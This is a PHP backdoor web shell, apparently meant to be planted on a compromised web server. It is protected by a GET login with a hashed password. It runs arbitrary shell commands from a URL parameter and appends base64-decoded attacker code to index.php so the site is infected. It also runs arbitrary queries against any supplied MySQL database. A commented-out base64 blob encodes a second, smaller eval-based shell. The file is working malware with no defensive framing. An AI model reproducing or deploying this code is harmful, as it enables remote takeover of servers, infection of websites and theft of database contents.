<?php
$user = "root"; 
$pass = "098f6bcd4621d373cade4e832627b4f6";

function mysql_riwif($host, $userw, $passw, $bdd, $query = NULL)
{
	if($mysqli = new mysqli($host, $userw, $passw, $bdd))
	{
		if($query == NULL)
		{
			if($mysqli->connect_errno) 
    			echo 'Failed to connect to MySQL: (' . $mysqli->connect_errno . ') ' . $mysqli->connect_error;
			else
				echo  'connected';
		}
		elseif($query != NULL)
		{
			if($dbs = $mysqli->query($query))
			{
				while($fetch = mysqli_fetch_array($dbs, MYSQLI_NUM))
				{
					foreach ($fetch as $key => $value) 
					{
						echo $value."\n";
					}
				}
			}
		}
	}
	else
		echo 'no mysqli plugin';
}

$session_start = 0;
if(isset($_GET['u']) && isset($_GET['p']))
{
	if($_GET['u'] == $user && md5($_GET['p']) == $pass)
		$session_start = 1;
	else
	{
		echo 'Bad login';
		exit(1);
	}
}
if($session_start == 1 && isset($_GET['cmd']))
{
	if($_GET['cmd'] == 'worm' && !empty($_GET['code']))
	{
		$code_worm = base64_decode($_GET['code']);

		if(file_exists('index.php'))
		{
			$open = fopen('index.php', 'a+');
			fwrite($open, "<?php $code_worm ?>");
			fclose($open);
			echo 'index.php';
		}
		elseif(file_exists('../index.php'))
		{
			$open = fopen('../index.php', 'a+');
			fwrite($open, "<?php $code_worm ?>");
			fclose($open);
			echo '../index.php';
		}
	}
	if($_GET['cmd'] == 'host') 
	{
		echo $_SERVER['HTTP_HOST'].':'.getcwd();
	}
	if($_GET['cmd'] == 'mysql' && !empty($_GET['uw']) && !empty($_GET['pw']) && !empty($_GET['bw']) && !empty($_GET['hw']))
	{
		$hostw = $_GET['hw'];
		$userw = $_GET['uw'];
		$passw = $_GET['pw'];
		$bddw = $_GET['bw'];
		if(!empty($_GET['q']))
			mysql_riwif($hostw, $userw, $passw, $bddw, $_GET['q']);
		else
			mysql_riwif($hostw, $userw, $passw, $bddw);
	}
	else 
		echo(shell_exec($_GET['cmd']." &"));
}

/*$shell = base64_decode('JHVzZXIgPSAncm9vdCc7DQokcGFzcyA9ICc3YjI0YWZjOGJjODBlNTQ4ZDY2YzRlN2ZmNzIxNzFjNSc7DQokc2Vzc2lvbl9zdGFydCA9IDA7DQppZihpc3NldCgkX0dFVFsndSddKSAmJiBpc3NldCgkX0dFVFsncCddKSkNCglpZigkX0dFVFsndSddID09ICR1c2VyICYmIG1kNSgkX0dFVFsncCddKSA9PSAkcGFzcykNCgkJJHNlc3Npb25fc3RhcnQgPSAxOw0KCWVsc2UNCgkJZWNobyAnQmFkIGxvZ2luJzsNCmlmKCRzZXNzaW9uX3N0YXJ0ID09IDEgJiYgaXNzZXQoJF9HRVRbJ2NtZCddKSkNCglpZigkX0dFVFsnY21kJ10gPT0gJ2hvc3QnKSBlY2hvICRfU0VSVkVSWydIVFRQX0hPU1QnXS5nZXRjd2QoKTsNCgllbHNlIGVjaG8oc2hlbGxfZXhlYygkX0dFVFsnY21kJ10uIiAmIikpOw==');
echo eval($shell); */
?>